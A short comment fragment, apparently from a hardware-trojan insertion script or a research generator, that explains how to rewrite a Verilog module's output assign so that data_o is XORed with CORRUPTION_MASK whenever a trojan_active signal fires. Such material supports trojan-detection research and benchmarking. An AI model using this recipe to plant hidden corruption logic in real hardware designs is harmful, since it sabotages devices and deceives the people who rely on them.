...
//
// IMPORTANT: data_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If data_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for data_o (or first output assign):
//     assign data_o = <expr>;
//   Replace with:
//     assign data_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
